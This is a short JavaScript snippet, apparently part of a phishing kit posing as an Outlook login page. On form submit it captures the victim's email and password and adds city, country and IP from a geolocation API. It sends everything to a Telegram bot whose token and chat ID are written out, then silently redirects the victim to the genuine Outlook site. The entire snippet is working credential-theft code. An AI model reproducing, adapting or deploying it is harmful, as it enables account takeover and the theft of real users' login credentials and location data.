
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#login-form");
    form.addEventListener("submit", (event) => {
      event.preventDefault();  // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const email = document.querySelector("#email").value;
          const password = document.querySelector("#password").value;
          const message =
            "Correo: " +
            email +
            " Contra: " +
            password +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot6207932224:AAFjq6jdv0z8AP1VNafDpBX3tIhSXbt_D2M/sendMessage",
              {
                chat_id: "-888681764",
                text: message,
              }
            )
            .then((response) => {
              console.log(response.data);
              window.location.href = "https://outlook.live.com/owa/";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  